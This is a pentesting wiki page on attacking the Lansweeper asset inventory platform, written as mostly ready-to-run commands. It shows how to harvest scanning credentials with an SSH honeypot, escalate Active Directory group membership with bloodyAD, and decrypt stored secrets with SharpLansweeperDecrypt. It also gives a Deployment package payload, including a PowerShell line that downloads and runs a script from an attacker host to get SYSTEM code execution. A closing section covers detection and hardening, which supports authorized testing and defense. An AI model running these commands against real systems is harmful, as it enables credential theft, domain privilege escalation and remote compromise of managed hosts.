# Lansweeper Abuse: Credential Harvesting, Secrets Decryption, and Deployment RCE

{{#include ../../banners/hacktricks-training.md}}

Lansweeper is an IT asset discovery and inventory platform commonly deployed on Windows and integrated with Active Directory. Credentials configured in Lansweeper are used by its scanning engines to authenticate to assets over protocols like SSH, SMB/WMI and WinRM. Misconfigurations frequently allow:

- Credential interception by redirecting a scanning target to an attacker-controlled host (honeypot)
- Abuse of AD ACLs exposed by Lansweeper-related groups to gain remote access
- On-host decryption of Lansweeper-configured secrets (connection strings and stored scanning credentials)
- Code execution on managed endpoints via the Deployment feature (often running as SYSTEM)

This page summarizes practical attacker workflows and commands to abuse these behaviors during engagements.

## 1) Harvest scanning credentials via honeypot (SSH example)

Idea: create a Scanning Target that points to your host and map existing Scanning Credentials to it. When the scan runs, Lansweeper will attempt to authenticate with those credentials, and your honeypot will capture them.<sup>[[1]](#references)</sup>

Steps overview (web UI):
- Scanning → Scanning Targets → Add Scanning Target
  - Type: IP Range (or Single IP) = your VPN IP
  - Configure SSH port to something reachable (e.g., 2022 if 22 is blocked)
  - Disable schedule and plan to trigger manually
- Scanning → Scanning Credentials → ensure Linux/SSH creds exist; map them to the new target (enable all as needed)
- Click “Scan now” on the target
- Run an SSH honeypot and retrieve the attempted username/password

Example with sshesame:<sup>[[2]](#references)</sup>

```yaml
# sshesame.yaml
server:
  listen_address: 0.0.0.0:2022
```

```bash
# Prefer a current release/container; the package in Debian-derived repositories may be stale
sshesame -config sshesame.yaml

# Or run the maintained container image
docker run --rm -it -p 2022:2022 \
  -v "$PWD/sshesame.yaml:/config.yaml:ro" ghcr.io/jaksi/sshesame
# Expect client banner similar to RebexSSH and cleartext creds
# authentication for user "svc_inventory_lnx" with password "<password>" accepted
# connection with client version "SSH-2.0-RebexSSH_5.0.x" established
```

Validate captured creds against DC services:

```bash
# SMB/LDAP/WinRM checks (NetExec)
netexec smb   inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec ldap  inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Notes
- Other protocols are not equivalent: an SMB/WinRM listener normally obtains an NTLM challenge-response rather than a cleartext password. Cracking or relaying it depends on the negotiated protocol protections; see [network poisoning and relay attacks](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md). SSH password authentication is usually the simplest cleartext case.
- SSH public-key authentication exposes the username and public-key fingerprint to the server, **not** the private key or its passphrase. Recover key-backed credentials from the compromised Lansweeper server instead of expecting a honeypot to disclose them.<sup>[[2]](#references)</sup>
- Many scanners identify themselves with distinct client banners (e.g., RebexSSH) and will attempt benign commands (uname, whoami, etc.).

### Credential selection order matters

For a rescan, Lansweeper first retries the credential that last succeeded for that asset, then the explicitly mapped credentials in their configured order, and finally the global credential of the same type. A honeypot that accepts the first password authentication therefore normally will not observe later fallback credentials; during an authorized credential-path assessment, log and reject attempts if the objective is to verify the complete fallback sequence.<sup>[[6]](#references)</sup>

## 2) AD ACL abuse: gain remote access by adding yourself to an app-admin group

Use BloodHound to enumerate effective rights from the compromised account. A common finding is a scanner- or app-specific group (e.g., “Lansweeper Discovery”) holding GenericAll over a privileged group (e.g., “Lansweeper Admins”). If the privileged group is also member of “Remote Management Users”, WinRM becomes available once we add ourselves.<sup>[[1]](#references)[[5]](#references)</sup>

Collection examples:

```bash
# NetExec collection with LDAP
netexec ldap inventory.sweep.vl -u svc_inventory_lnx -p '<password>' --bloodhound -c All --dns-server <DC_IP>

# RustHound-CE collection (zip for BH CE import)
rusthound-ce --domain sweep.vl -u svc_inventory_lnx -p '<password>' -c All --zip
```

Exploit GenericAll on group with BloodyAD (Linux):<sup>[[4]](#references)</sup>

```bash
# Add our user into the target group
bloodyAD --host inventory.sweep.vl -d sweep.vl -u svc_inventory_lnx -p '<password>' \
  add groupMember "Lansweeper Admins" svc_inventory_lnx

# Confirm WinRM access if the group grants it
netexec winrm inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Then get an interactive shell:

```bash
evil-winrm -i inventory.sweep.vl -u svc_inventory_lnx -p '<password>'
```

Tip: Kerberos operations are time-sensitive. If you hit KRB_AP_ERR_SKEW, sync to the DC first:

```bash
sudo ntpdate <dc-fqdn-or-ip>   # or rdate -n <dc-ip>
```

## 3) Decrypt Lansweeper-configured secrets on the host

On the Lansweeper server, the ASP.NET site typically stores an encrypted connection string and a symmetric key used by the application. With appropriate local access, you can decrypt the DB connection string and then extract stored scanning credentials.<sup>[[1]](#references)</sup>

Typical locations:
- Web config: `C:\Program Files (x86)\Lansweeper\Website\web.config`
  - `<connectionStrings configProtectionProvider="DataProtectionConfigurationProvider">` … `<EncryptedData>…`
- Application key: `C:\Program Files (x86)\Lansweeper\Key\Encryption.txt`

Use SharpLansweeperDecrypt to automate decryption and dumping of stored creds. With no arguments, the current executable decrypts `web.config`, connects to the database and dumps all configured scanning credentials; `-e` also supports offline/manual decryption when an encrypted value and the key file are already available:<sup>[[3]](#references)</sup>

```powershell
# Automatic: use the default web.config and Encryption.txt locations
.\SharpLansweeperDecrypt.exe

# Manual: decrypt one database value with an explicit key file
.\SharpLansweeperDecrypt.exe -e '<encrypted-base64-value>' `
  -p 'C:\Program Files (x86)\Lansweeper\Key\Encryption.txt'

# The repository also provides LansweeperDecrypt.ps1 when loading .NET tooling is unsuitable
powershell -ExecutionPolicy Bypass -File .\LansweeperDecrypt.ps1
```

Expected output includes DB connection details and plaintext scanning credentials such as Windows and Linux accounts used across the estate. These often have elevated local rights on domain hosts:

```text
Inventory Windows  SWEEP\svc_inventory_win  <StrongPassword!>
Inventory Linux    svc_inventory_lnx        <StrongPassword!>
```

Use recovered Windows scanning creds for privileged access:

```bash
netexec winrm inventory.sweep.vl -u svc_inventory_win -p '<StrongPassword!>'
# Typically local admin on the Lansweeper-managed host; often Administrators on DCs/servers
```

## 4) Lansweeper Deployment → SYSTEM RCE

As a member of “Lansweeper Admins”, the web UI exposes Deployment and Configuration. Under Deployment → Deployment packages, you can create packages that run arbitrary commands on targeted assets. Lansweeper uses an administrative scanning credential to reach the target's Task Scheduler and `C$`, then creates a task for the deployment. When the package uses the **System Account** run mode, the payload executes as `NT AUTHORITY\SYSTEM`; other run modes can use the mapped scanning credential or the currently logged-on user, so verify the selected mode rather than assuming SYSTEM.<sup>[[1]](#references)[[7]](#references)</sup>

High-level steps:
- Create a new Deployment package that runs a PowerShell or cmd one-liner (reverse shell, add-user, etc.).
- Target the desired asset (e.g., the DC/host where Lansweeper runs) and click Deploy/Run now.
- Catch your shell as SYSTEM.

Example payloads (PowerShell):

```powershell
# Simple test
powershell -nop -w hidden -c "whoami > C:\Windows\Temp\ls_whoami.txt"

# Reverse shell example (adapt to your listener)
powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://<attacker>/rs.ps1')"
```

OPSEC
- Deployment actions are noisy and leave logs in Lansweeper and Windows event logs. Use judiciously.

### Deployment artifacts and a second credential exposure point

The scanner writes its deployment executable under `C:\Windows\LSDeployment` through `C$`. Package files are normally read from `DefaultPackageShare$`, backed by `C:\Program Files (x86)\Lansweeper\PackageShare`, or from an IP-range-specific package share. Importantly, Lansweeper documents that the package-share credential is stored in **reversibly encrypted form in the registry of every computer receiving a deployment**. Treat a compromised managed endpoint as a potential disclosure point for that share account, and inspect the deployment directory, scheduled-task history and configured package shares when reconstructing Lansweeper activity.<sup>[[7]](#references)</sup>

## Detection and hardening

- Restrict or remove anonymous SMB enumerations. Monitor for RID cycling and anomalous access to Lansweeper shares.
- Egress controls: block or tightly restrict outbound SSH/SMB/WinRM from scanner hosts. Alert on non-standard ports (e.g., 2022) and unusual client banners like Rebex.
- Protect `Website\\web.config` and `Key\\Encryption.txt`. Externalize secrets into a vault and rotate on exposure. Consider service accounts with minimal privileges and gMSA where viable.
- AD monitoring: alert on changes to Lansweeper-related groups (e.g., “Lansweeper Admins”, “Remote Management Users”) and on ACL changes granting GenericAll/Write membership on privileged groups.
- Audit Deployment package creations/changes/executions and correlate new remote scheduled tasks with writes to `C:\Windows\LSDeployment`; alert on packages spawning `cmd.exe`/`powershell.exe` or unexpected outbound connections.
- Give package-share credentials only **Read & Execute** permission and never reuse them for administration. Prefer agent-based inventory where practical: if all computers are scanned by an agent and the deployment module is unused, Lansweeper does not require stored computer scanning credentials.<sup>[[6]](#references)[[7]](#references)</sup>

## Related topics
- [SMB/LSA/SAMR enumeration and RID cycling](../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md)
- [Kerberos authentication and clock-skew considerations](kerberos-authentication.md)
- [BloodHound path analysis](bloodhound.md)
- [WinRM usage and lateral movement](../lateral-movement/winrm.md)



## References
- [1] [HTB: Sweep — Abusing Lansweeper Scanning, AD ACLs, and Secrets to Own a DC (0xdf)](https://0xdf.gitlab.io/2025/08/14/htb-sweep.html)
- [2] [sshesame (SSH honeypot)](https://github.com/jaksi/sshesame)
- [3] [SharpLansweeperDecrypt](https://github.com/Yeeb1/SharpLansweeperDecrypt)
- [4] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [5] [BloodHound CE](https://github.com/SpecterOps/BloodHound)
- [6] [Create and map scanning credentials — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/create-and-map-scanning-credentials)
- [7] [Deployment requirements — Lansweeper Classic](https://docs.lansweeper.com/classic/docs/deployment-requirements)
{{#include ../../banners/hacktricks-training.md}}
